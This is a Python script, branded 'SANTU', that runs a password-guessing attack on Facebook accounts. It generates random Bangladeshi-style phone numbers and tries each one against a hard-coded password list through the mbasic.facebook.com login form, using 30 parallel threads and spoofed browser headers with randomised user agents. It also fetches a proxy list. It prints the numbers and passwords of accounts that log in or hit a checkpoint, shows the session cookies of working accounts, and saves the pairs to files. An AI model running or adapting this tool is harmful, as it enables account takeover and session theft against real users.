import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
    
def __init__(self):
        self.id = []
        self.ok = []
        self.cp = []
        self.loop = 0

logo = ("""

==============================================
░██████╗░█████╗░███╗░░██╗████████╗██╗░░░██╗
██╔════╝██╔══██╗████╗░██║╚══██╔══╝██║░░░██║
╚█████╗░███████║██╔██╗██║░░░██║░░░██║░░░██║
░╚═══██╗██╔══██║██║╚████║░░░██║░░░██║░░░██║
██████╔╝██║░░██║██║░╚███║░░░██║░░░╚██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░
==============================================
""")
logo1 = ("""
==============================================
░██████╗░█████╗░███╗░░██╗████████╗██╗░░░██╗
██╔════╝██╔══██╗████╗░██║╚══██╔══╝██║░░░██║
╚█████╗░███████║██╔██╗██║░░░██║░░░██║░░░██║
░╚═══██╗██╔══██║██║╚████║░░░██║░░░██║░░░██║
██████╔╝██║░░██║██║░╚███║░░░██║░░░╚██████╔╝
╚═════╝░╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░░╚═════╝░
==============================================
  """)

def SANTUx():
	print('SANTU')

def Main():
        os.system("clear")
        print(logo)
        print("[01]Random Bangldesh Clone")
        print("[02]EXIT")
        SANTU =input("\n✺Engine start : ")
        
        if SANTU in ["01","1"]:
            fuck()
        if SANTU in ["00"]:
            exit()
        else:
            exit()
#===========𝙁𝙐𝘾𝙆 𝙔𝙊𝙐          
def fuck():
    user=[]
    os.system('clear')
    print(logo)
    print('SIM CODE 034 033 038')
    code = input('✺{SANTU}✺𝗖𝗛𝗢𝗜𝗖𝗘 : ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    os.system('clear')
    print(logo)
    print('✺[SANTU]𝙇𝙈𝙏✺𝟮𝟬𝟬𝟬✺𝟯𝟬𝟬𝟬✺𝟱𝟬𝟬𝟬✺𝟭𝟬𝟬𝟬𝟬')
    limit = int(input('✺[SANTU]✺𝗖𝗛𝗢𝗜𝗖𝗘 : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo1)
        tl = str(len(user))
        
        print('✺SANTU━FACEBOOK  𝗜𝗗✺'+tl)
        print("✺SANTU━SIM CODE✺"+code)
        print('✺ENGINE━WORK ✺WIFi/DATA')
        print('✺PAID COMMAND')
       
        for love in user:
            uid = code+name+cod+love
            pwx = ['fiderana','Fiderana','lafatra','fahendrena','Fahendrena','amboara','Amboara','miangaly','Miangaly','miangola','Miangola','fanasina','Fanasina','finoanq','Finoana','fandresena','Fandresena','nantenaina','rakotomalala','Rakotomalala','tanjona','Tanjona','solofo','Solofo','Nantenaina','nilaina','Nilaina','nirina','Nirina','Narindra','Rakoto','nomena','Nomena','Anjara','anjara','faniry','Faniry','rakoto','safidy','hasina','Hasina','tsilavina','Tsilavina','finaritra','Finaritra','fanomezana','Fanomezana','Sarindra','sarindra','nambinina','Nambinina','Sitraka','sitraka','mamitiana','Mamitiana','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','sarobidy','Sarobidy','andriatsitohaina','Andriatsitohaina','lalaina','Lafatra','Jessica','Lalaina','mahery','Mahery','jessica','mandresy','Mandresy','harena','Harena']
            yaari.submit(emran2,uid,pwx,tl)
        
    print('✺SANTU] Crack  Completed')
    print('✺SANTU Tool] OK ID saved')
    print('✺SANTU] CP Ids Saved in SANTU/CP.txt')
    
def emran2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()           
            sys.stdout.write('✺SANTU✺%s/%s✺𝗖𝗣-𝗶𝗗%s,❌✺𝗢𝗞-𝗜𝗗🔥%s\r'%(loop,tl,len(cps),len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
#_________𝗨𝗣𝗗𝗔𝗧𝗘 𝗦𝗬𝗦𝗧𝗘𝗠➻➲🥰🥰        
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method':'GET',
            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
            'scheme':'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '3',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"RMX3085"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',
}
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text           
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
#_________𝗢𝗞_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗢𝗞✅-𝗜𝗗-------➲🥰🥰   
                
                print(f"""
FACEBOOK━━NUMBER━━  {uid} 
FACEBOOK━━PASSWORD━━{ps}
SANTU-Cookis(𝗢𝗞❂) {coki}
""")
               
                open('/sdcard/SANTU/OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
 #_________𝗖𝗣_𝗜𝗡_𝗙𝗥𝗢---➲👇👇
#__________𝗟𝗢𝗖𝗞-𝗜𝗗------➲😓😓
                print(f"""
 FACEBOOK━━NUMBER ━━{uid} 
 FACEBOOK━━PASSWORD━━{ps}
""")
                open('/sdcard/SANTU.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
Main()
